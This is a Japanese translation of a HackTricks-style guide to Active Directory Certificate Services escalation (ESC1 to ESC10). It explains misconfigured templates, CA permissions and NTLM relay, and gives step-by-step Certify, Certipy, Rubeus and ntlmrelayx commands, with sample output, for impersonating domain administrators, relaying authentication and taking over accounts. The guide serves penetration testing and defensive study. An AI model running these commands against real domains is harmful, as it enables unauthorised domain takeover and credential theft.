# AD CS Domain Escalation

{{#include ../../../banners/hacktricks-training.md}}


**これは、記事の escalation technique セクションの概要です:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Misconfigured Certificate Templates - ESC1

### Explanation

### Misconfigured Certificate Templates - ESC1 の説明

- **Enterprise CA によって、低権限ユーザーに Enrolment rights が付与されている。**
- **Manager approval が不要である。**
- **Authorized personnel による署名が不要である。**
- **Certificate templates の Security descriptors が過度に許可的であり、低権限ユーザーが Enrolment rights を取得できる。**
- **Certificate templates が、authentication を容易にする EKU を定義するよう構成されている:**
- Client Authentication (OID 1.3.6.1.5.5.7.3.2)、PKINIT Client Authentication (1.3.6.1.5.2.3.4)、Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2)、Any Purpose (OID 2.5.29.37.0)、または EKU なし (SubCA) などの Extended Key Usage (EKU) identifiers が含まれている。
- **Certificate Signing Request (CSR) に subjectAltName を含めることが requesters に許可されている:**
- Active Directory (AD) は、証明書に存在する場合、identity verification において subjectAltName (SAN) を優先する。つまり、CSR で SAN を指定することにより、任意のユーザー (例: domain administrator) になりすますための証明書を要求できる。requester が SAN を指定できるかどうかは、`mspki-certificate-name-flag` property を通じて certificate template の AD object に示される。この property は bitmask であり、`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag が存在すると、requester による SAN の指定が許可される。

> [!CAUTION]
> この構成では、低権限ユーザーが任意の SAN を指定した証明書を要求できるため、Kerberos または SChannel を介して任意の domain principal として authentication できる。

この feature は、products や deployment services による HTTPS または host certificates のオンザフライ生成をサポートするため、または理解不足によって有効化されることがある。

このオプションを使用して証明書を作成すると warning が表示される。ただし、既存の certificate template (たとえば `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` が有効な `WebServer` template) を複製し、authentication OID を含めるよう変更した場合には warning が表示されない。<sup>[[6]](#references)</sup>

### Abuse

**vulnerable certificate templates を見つける**には、次を実行できます:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
**この脆弱性を悪用して管理者になりすますには、次を実行します。**
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
その後、生成した**証明書を `.pfx`**形式に変換し、再び**Rubeus または certipy を使用して認証**できます:<sup>[[5]](#references)</sup>
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windows バイナリの「Certreq.exe」と「Certutil.exe」を使用して PFX を生成できます: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

AD Forest の構成スキーマ内にある証明書テンプレートの列挙は、特に承認や署名を必要とせず、Client Authentication または Smart Card Logon EKU を持ち、`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` フラグが有効になっているものを対象として、次の LDAP クエリを実行することで行えます:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Misconfigured Certificate Templates - ESC2

### Explanation

2つ目のabuse scenarioは、1つ目のvariationです。

1. Enrollment rightsが、Enterprise CAによってlow-privileged usersに付与されている。
2. Manager approvalの要件が無効化されている。
3. Authorized signaturesの必要性が省略されている。
4. Certificate templateの過度に permissive なsecurity descriptorにより、low-privileged usersにcertificate enrollment rightsが付与されている。
5. **Certificate templateにAny Purpose EKUまたはEKUなしが含まれるよう定義されている。**

**Any Purpose EKU**により、attackerはclient authentication、server authentication、code signingなど、**あらゆる目的**で証明書を取得できます。このscenarioのexploitには、**ESC3で使用されるtechnique**と同じものを利用できます。

**EKUなし**の証明書はsubordinate CA certificatesとして機能し、**あらゆる目的**に悪用でき、**新しい証明書への署名にも使用できます**。したがって、attackerはsubordinate CA certificateを利用して、新しい証明書に任意のEKUやfieldを指定できます。

ただし、subordinate CAが**`NTAuthCertificates`** objectから信頼されていない場合（デフォルト設定）、**domain authentication**用に作成された新しい証明書は機能しません。それでもattackerは、**任意のEKU**と任意のcertificate valuesを持つ**新しい証明書を作成できます**。これらは、さまざまな目的（例：code signing、server authenticationなど）に**悪用される**可能性があり、SAML、AD FS、IPSecなど、network内の他のapplicationsにも重大な影響を及ぼす可能性があります。<sup>[[6]](#references)</sup>

AD Forestのconfiguration schema内でこのscenarioに一致するtemplatesをenumerateするには、次のLDAP queryを実行できます：
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## 設定ミスのある Enrolment Agent Templates - ESC3

### 解説

このシナリオは最初と2番目のシナリオに似ていますが、**異なる EKU**（Certificate Request Agent）と**2つの異なる templates**（そのため要件も2セット）を**悪用**します。

**Certificate Request Agent EKU**（OID 1.3.6.1.4.1.311.20.2.1）は、Microsoft のドキュメントでは **Enrollment Agent** と呼ばれ、ある principal が**別の user に代わって** **certificate** を**enroll**できるようにします。

**「enrollment agent」**はこのような **template** に対して **enroll**し、取得した**certificate を使用して、別の user に代わって CSR に co-sign**します。その後、**co-signed CSR** を CA に**送信**し、**「enroll on behalf of」**を許可する **template** に対して enroll します。CA は**「別の」user に属する certificate**を返します。<sup>[[6]](#references)</sup>

**要件 1:**

- Enterprise CA により、権限の低い users に enrollment rights が付与されている。
- manager approval の要件が省略されている。
- authorized signatures の要件がない。
- certificate template の security descriptor が過度に permissive で、権限の低い users に enrollment rights を付与している。
- certificate template に Certificate Request Agent EKU が含まれており、他の principals に代わって他の certificate templates を要求できる。

**要件 2:**

- Enterprise CA が権限の低い users に enrollment rights を付与している。
- manager approval が bypass されている。
- template の schema version が 1 または 2 より大きく、Certificate Request Agent EKU を必要とする Application Policy Issuance Requirement が指定されている。
- certificate template に定義された EKU により、domain authentication が許可されている。
- enrollment agents に対する制限が CA に適用されていない。

### Abuse

[**Certify**](https://github.com/GhostPack/Certify) または [**Certipy**](https://github.com/ly4k/Certipy) を使用して、このシナリオを abuse できます:<sup>[[4]](#references)</sup>
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
**enrollment agent certificate**の**取得**を許可されている**ユーザー**、enrollment **agents**がenrollを許可されているテンプレート、およびenrollment agentが代理として行動できる**アカウント**は、enterprise CAによって制限できます。これは、`certsrc.msc` **snap-in**を開き、**CAを右クリック**して、**Propertiesをクリック**し、「Enrollment Agents」タブに**移動**することで実行できます。

ただし、CAの**デフォルト**設定は「**Do not restrict enrollment agents**」であることに注意が必要です。管理者がenrollment agentsの制限を有効にし、「Restrict enrollment agents」に設定した場合でも、デフォルト構成は依然として極めて permissive です。これにより、**Everyone**がすべてのテンプレートに、任意のユーザーとしてenrollできます。

## 脆弱なCertificate Template Access Control - ESC4

### **説明**

**certificate templates**上の**security descriptor**は、特定の**AD principals**がテンプレートに対して持つ**permissions**を定義します。

**attacker**が**template**を**変更**し、**以前のセクション**で説明した**悪用可能な設定不備**を導入するために必要な**permissions**を有している場合、privilege escalationが可能になります。

certificate templatesに適用される注目すべきpermissionsは次のとおりです:<sup>[[6]](#references)</sup>

- **Owner:** オブジェクトに対する暗黙的なcontrolを付与し、任意の属性を変更できるようにします。
- **FullControl:** 任意の属性を変更する機能を含め、オブジェクトに対する完全な権限を有効にします。
- **WriteOwner:** オブジェクトのownerを、attackerがcontrolするprincipalに変更できます。
- **WriteDacl:** access controlsを調整でき、attackerにFullControlを付与できる可能性があります。
- **WriteProperty:** 任意のオブジェクトプロパティを編集できます。

### Abuse

templatesおよびその他のPKIオブジェクトに対する編集権限を持つprincipalsを特定するには、Certifyでenumerateします:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
前の例と同様の privesc の例です。

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 は、ユーザーが certificate template に対する write privileges を持っている状態です。これは例えば、certificate template の設定を上書きして、その template を ESC1 に対して脆弱にするために悪用できます。

上のパスからわかるように、これらの privileges を持っているのは `JOHNPC` だけですが、私たちのユーザー `JOHN` には `JOHNPC` への新しい `AddKeyCredentialLink` edge があります。この technique は certificates に関連しているため、この攻撃も実装しました。これは [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) として知られています。<sup>[[8]](#references)</sup> ここでは、被害者の NT hash を取得するための Certipy の `shadow auto` command を少し紹介します。
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** は、1つのコマンドで証明書テンプレートの設定を上書きできます。**デフォルト**では、Certipy は設定を上書きして **ESC1 に対して脆弱な状態にします**。また、**古い設定を保存するために `-save-old` パラメータを指定することもできます**。これは、攻撃後に設定を**復元**する際に役立ちます。
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## 脆弱な PKI Object Access Control - ESC5

### 説明

証明書テンプレートや Certification Authority 以外の複数のオブジェクトを含む、相互接続された ACL ベースの関係の広範なネットワークは、AD CS システム全体のセキュリティに影響を与える可能性があります。セキュリティに大きな影響を及ぼすこれらのオブジェクトには、以下が含まれます。

- S4U2Self や S4U2Proxy などの仕組みによって侵害される可能性がある、CA server の AD computer object。
- CA server の RPC/DCOM server。
- 特定の container path `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>` 内にある、任意の descendant AD object または container。この path には、Certificate Templates container、Certification Authorities container、NTAuthCertificates object、Enrollment Services Container などの container や object が含まれますが、これらに限定されません。

低権限の attacker がこれらの重要なコンポーネントのいずれかを制御できるようになると、PKI system のセキュリティが侵害される可能性があります。<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### 説明

[**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage) で取り上げられている内容では、Microsoft が説明している **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag の影響についても扱われています。この configuration を Certification Authority (CA) で有効にすると、Active Directory® から構築された request を含む **任意の request** に、**user-defined values** を **subject alternative name** に含めることが可能になります。これにより、**intruder** は、domain **authentication** 用に設定された **任意の template**、具体的には標準の User template のように **unprivileged** user による enrollment を許可している template を通じて enrollment できます。その結果、intruder は domain administrator または domain 内の **その他の有効な entity** として authenticate するための certificate を取得できます。<sup>[[9]](#references)</sup>

**注**: `certreq.exe` の `-attrib "SAN:"` argument（「Name Value Pairs」と呼ばれます）を使用して Certificate Signing Request (CSR) に **alternative names** を追加する方法は、ESC1 における SAN の exploitation strategy とは異なります。ここでの違いは、account information がどのようにカプセル化されるかにあります。つまり、extension 内ではなく certificate attribute 内に格納されます。

### Abuse

setting が有効になっているか確認するには、organizations は `certutil.exe` を使用して次の command を実行できます。
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
この操作は基本的に **remote registry access** を使用するため、代替アプローチとして次の方法が考えられます:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
[**Certify**](https://github.com/GhostPack/Certify) や [**Certipy**](https://github.com/ly4k/Certipy) などのツールは、この設定ミスを検出して悪用できます:<sup>[[4]](#references)</sup>
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
これらの設定を変更するには、**ドメイン管理者**権限または同等の権限を持っていることを前提として、次のコマンドを任意のワークステーションから実行できます。
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
環境でこの設定を無効にするには、次のコマンドでフラグを削除できます:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> 2022年5月のsecurity updates後に新たに発行された**certificates**には、**requesterの`objectSid` property**を組み込んだ**security extension**が含まれます。ESC1では、このSIDは指定されたSANから導出されます。ただし、**ESC6**では、SIDはSANではなく**requesterの`objectSid`**を反映します。\
> ESC6をexploitするには、**SANよりも新しいsecurity extensionを優先する**ESC10（Weak Certificate Mappings）の影響をシステムが受けやすいことが不可欠です。

## Vulnerable Certificate Authority Access Control - ESC7

### 攻撃 1

#### Explanation

Certificate AuthorityのAccess controlは、CAのアクションを管理する一連のpermissionsによって維持されます。これらのpermissionsは、`certsrv.msc`にアクセスし、CAを右クリックしてPropertiesを選択し、Securityタブに移動することで確認できます。さらに、次のようなコマンドを使用してPSPKI moduleでpermissionsをenumerateできます:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
これは、主な権限である **`ManageCA`** と **`ManageCertificates`** に関する洞察を提供します。これらはそれぞれ「CA administrator」と「Certificate Manager」のロールに対応します。<sup>[[6]](#references)</sup>

#### Abuse

証明機関に対する **`ManageCA`** 権限を持つ principal は、PSPKI を使用してリモートから設定を操作できます。これには、任意の template で SAN の指定を許可する **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag の切り替えが含まれ、domain escalation における重要な要素となります。

このプロセスは、PSPKI の **Enable-PolicyModuleFlag** cmdlet を使用することで簡略化できます。これにより、GUI を直接操作せずに変更できます。

**`ManageCertificates`** 権限を持つと、保留中の request を承認でき、「CA certificate manager approval」という safeguard を実質的に回避できます。

**Certify** と **PSPKI** module を組み合わせることで、certificate の request、承認、download を実行できます。
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### 攻撃 2

#### 解説

> [!WARNING]
> **前の攻撃**では、**`Manage CA`** 権限を使用して **EDITF_ATTRIBUTESUBJECTALTNAME2** フラグを **有効化**し、**ESC6 attack** を実行しましたが、CA サービス（`CertSvc`）が再起動されるまで、この変更は有効になりません。ユーザーが **`Manage CA`** アクセス権を持っている場合、そのユーザーには **サービスを再起動する権限**も付与されます。ただし、これは**リモートからサービスを再起動できる**という意味ではありません。さらに、2022 年 5 月の security updates により、ほとんどの patch 適用済み環境では、E**SC6 は out of the box では動作しない可能性があります**。

そのため、ここでは別の攻撃を紹介します。

前提条件:

- **`ManageCA` permission** のみ
- **`Manage Certificates`** permission（**`ManageCA`** から付与可能）
- Certificate template **`SubCA`** が **有効化**されていること（**`ManageCA`** から有効化可能）

この technique は、**`Manage CA`** および **`Manage Certificates`** access right を持つユーザーが、**失敗した certificate requests を発行できる**という事実を利用します。**`SubCA`** certificate template は **ESC1** に対して **vulnerable** ですが、template に enroll できるのは**管理者のみ**です。したがって、**user** は **`SubCA`** への enroll を **request** できます。この request は**拒否**されますが、**その後 manager によって発行されます**。<sup>[[6]](#references)</sup>

#### Abuse

自身の user を新しい officer として追加することで、**`Manage Certificates`** access right を**自分に付与**できます。
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
**`SubCA`** テンプレートは、`-enable-template` パラメータを使用して **CA 上で有効化**できます。デフォルトでは、`SubCA` テンプレートは有効になっています。
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
この攻撃の前提条件を満たしている場合、まず **`SubCA` template に基づく certificate を request** します。

**この request は deny されます**が、private key を保存し、request ID を記録しておきます。
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
**`Manage CA` と `Manage Certificates`** を使用すると、`ca` コマンドと `-issue-request <request ID>` パラメーターで、失敗した **certificate** リクエストを発行できます。
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
最後に、`req` コマンドと `-retrieve <request ID>` パラメーターを使用して、**発行された証明書を取得**できます。
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Attack 3 – Manage Certificates Extension Abuse (SetExtension)

#### 説明

従来の ESC7 abuse（EDITF 属性の有効化や pending request の承認）に加えて、**Certify 2.0** により、Enterprise CA 上の *Manage Certificates*（別名 **Certificate Manager / Officer**）role だけを必要とする、まったく新しい primitive が明らかになりました。<sup>[[3]](#references)</sup>

`ICertAdmin::SetExtension` RPC method は、*Manage Certificates* を保持する任意の principal が実行できます。この method は従来、正規の CA が **pending** request の extension を更新するために使用していましたが、攻撃者はこれを abuse して、承認待ちの request に **非 default の certificate extension**（例えば `1.1.1.1` のような custom *Certificate Issuance Policy* OID）を**追加**できます。

対象 template がその extension の default value を**定義していない**場合、request が最終的に発行される際に CA は攻撃者が制御する value を上書きしません。そのため、生成された certificate には攻撃者が選択した extension が含まれ、次のことが可能になります。

* 他の vulnerable template の Application / Issuance Policy requirements を満たす（privilege escalation につながる）。
* certificate に追加の EKU や policy を注入し、third-party system で予期しない trust を付与する。

つまり、これまで ESC7 の「より権限の弱い」側と考えられていた *Manage Certificates* は、CA configuration に触れることなく、より制限の厳しい *Manage CA* right を必要とせずに、完全な privilege escalation や長期的な persistence に利用できるようになりました。

#### Certify 2.0 で primitive を abuse する

1. **pending のままになる certificate request を submit する。** manager approval を必要とする template で強制できます。
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. 新しい `manage-ca` command を使用して、pending request に custom extension を**追加**する。
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*template がすでに *Certificate Issuance Policies* extension を定義していない場合、上記の value は発行後も保持されます。*

3. （role に *Manage Certificates* approval rights もある場合は）request を**発行**するか、operator が承認するまで待機する。発行されたら certificate を download する。
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. 生成された certificate には malicious な issuance-policy OID が含まれるため、後続の attack（例：ESC13、domain escalation など）で使用できます。

> NOTE: 同じ attack は、`ca` command と `-set-extension` parameter を使用して Certipy ≥ 4.7 でも実行できます。

## NTLM Relay to AD CS HTTP Endpoints – ESC8

### 説明

> [!TIP]
> **AD CS が install されている** environment で、**vulnerable な web enrollment endpoint が存在**し、さらに少なくとも 1 つの **certificate template が publish されており、domain computer enrollment と client authentication を許可**している場合（default の **`Machine`** template など）、**spooler service が active な任意の computer を attacker が compromise できるようになります**！

AD CS は、administrator が install できる追加の server role を通じて、複数の **HTTP-based enrollment method** をサポートしています。HTTP-based certificate enrollment 用のこれらの interface は、**NTLM relay attack** の影響を受けます。攻撃者は、**compromise した machine から inbound NTLM で authenticate する任意の AD account を impersonate できます**。victim account を impersonate している間、攻撃者はこれらの web interface にアクセスし、`User` または `Machine` certificate template を使用して **client authentication certificate を request**できます。

- **web enrollment interface**（`http://<caserver>/certsrv/` で利用できる古い ASP application）は、default では HTTP のみであり、NTLM relay attack に対する protection を提供しません。さらに、Authorization HTTP header を通じて NTLM authentication のみを明示的に許可するため、Kerberos などのより secure な authentication method は使用できません。
- **Certificate Enrollment Service**（CES）、**Certificate Enrollment Policy**（CEP）Web Service、および **Network Device Enrollment Service**（NDES）は、default で Authorization HTTP header を介した negotiate authentication をサポートします。Negotiate authentication は **Kerberos と NTLM の両方**をサポートするため、relay attack 中に攻撃者は authentication を **NTLM に downgrade**できます。これらの web service は default で HTTPS を有効にしますが、HTTPS だけでは **NTLM relay attack から保護できません**。HTTPS service を NTLM relay attack から保護するには、HTTPS と channel binding の組み合わせが必要です。残念ながら、AD CS は IIS 上で Extended Protection for Authentication を有効化しません。これは channel binding に必要です。<sup>[[6]](#references)</sup>

NTLM relay attack に関する一般的な **問題**は、NTLM session の**持続時間が短い**ことと、**NTLM signing を必要とする**service と攻撃者が対話できないことです。

しかし、この制限は、NTLM relay attack を abuse して user 用の certificate を取得することで克服できます。certificate の validity period が session の duration を決定し、その certificate は **NTLM signing を要求する**service でも使用できるためです。stolen certificate の利用方法については、次を参照してください。


{{#ref}}
account-persistence.md
{{#endref}}

NTLM relay attack のもう 1 つの制限は、**attacker-controlled machine が victim account によって authenticate される必要がある**ことです。攻撃者は待機するか、この authentication を**強制**できます。


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Abuse**

[**Certify**](https://github.com/GhostPack/Certify) の `cas` は、**enabled な HTTP AD CS endpoint** を列挙します。<sup>[[4]](#references)</sup>
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

`msPKI-Enrollment-Servers` プロパティは、エンタープライズ Certificate Authority（CA）が Certificate Enrollment Service（CES）のエンドポイントを保存するために使用します。これらのエンドポイントは、**Certutil.exe** ツールを使用して解析および一覧表示できます：
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Certifyを用いた悪用
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### [Certipy](https://github.com/ly4k/Certipy)を使用したAbuse

証明書のリクエストは、デフォルトでCertipyによってテンプレート`Machine`または`User`に基づいて実行されます。これは、relayされるアカウント名が`$`で終わるかどうかによって決まります。別のテンプレートを指定するには、`-template`パラメータを使用します。

その後、[PetitPotam](https://github.com/ly4k/PetitPotam)のようなtechniqueを使用して、authenticationを強制できます。domain controllersを扱う場合は、`-template DomainController`の指定が必要です。
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## セキュリティ拡張なし - ESC9 <a href="#id-5485" id="id-5485"></a>

### 説明

**`msPKI-Enrollment-Flag`** の新しい値 **`CT_FLAG_NO_SECURITY_EXTENSION`**（`0x80000`）は、ESC9 と呼ばれ、証明書への **新しい `szOID_NTDS_CA_SECURITY_EXT` セキュリティ拡張** の埋め込みを防止します。このフラグは、**`StrongCertificateBindingEnforcement`** が `1`（デフォルト設定）に設定されている場合に重要になります。これは、`2` に設定されている場合とは異なります。Kerberos または Schannel に対するより弱い証明書マッピングが悪用される可能性があるシナリオ（ESC10 など）では、ESC9 が存在しない場合は要件が変わらないため、このフラグの重要性がさらに高まります。<sup>[[7]](#references)</sup>

このフラグの設定が重要になる条件は次のとおりです。

- `StrongCertificateBindingEnforcement` が `2` に変更されていない（デフォルトは `1`）、または `CertificateMappingMethods` に `UPN` フラグが含まれている。
- 証明書の `msPKI-Enrollment-Flag` 設定に `CT_FLAG_NO_SECURITY_EXTENSION` フラグが付与されている。
- 証明書にクライアント認証 EKU が指定されている。
- 別のアカウントを compromise するために、任意のアカウントに対する `GenericWrite` 権限がある。

### Abuse Scenario

`John@corp.local` が `Jane@corp.local` に対する `GenericWrite` 権限を持っており、`Administrator@corp.local` を compromise することを目的としているとします。`Jane@corp.local` が enroll できる `ESC9` 証明書テンプレートは、`msPKI-Enrollment-Flag` 設定で `CT_FLAG_NO_SECURITY_EXTENSION` フラグが有効になっています。

まず、`John` の `GenericWrite` を利用して Shadow Credentials により `Jane` の hash を取得します。
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
その後、`Jane` の `userPrincipalName` は、意図的に `@corp.local` ドメイン部分を省略して `Administrator` に変更されます：
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
この変更は、`Administrator@corp.local` が `Administrator` の `userPrincipalName` として別個に維持されるため、制約に違反しません。

これに続いて、脆弱性があるとマークされた `ESC9` certificate template が `Jane` として要求されます：
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
証明書の `userPrincipalName` には `Administrator` が反映されており、「object SID」は一切含まれていないことに注意してください。

その後、`Jane` の `userPrincipalName` は元の `Jane@corp.local` に戻されます。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
発行された証明書を使用して認証を試行すると、`Administrator@corp.local` の NT hash が取得されます。証明書にドメインの指定がないため、コマンドには `-domain <domain>` を含める必要があります。
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
## 弱い Certificate Mappings - ESC10

### Explanation

ドメインコントローラー上の 2 つのレジストリキー値が ESC10 に関連しています。

- `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` 配下の `CertificateMappingMethods` のデフォルト値は `0x18`（`0x8 | 0x10`）で、以前は `0x1F` に設定されていました。
- `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` 配下の `StrongCertificateBindingEnforcement` のデフォルト設定は `1` で、以前は `0` でした。<sup>[[7]](#references)</sup>

**ケース 1**

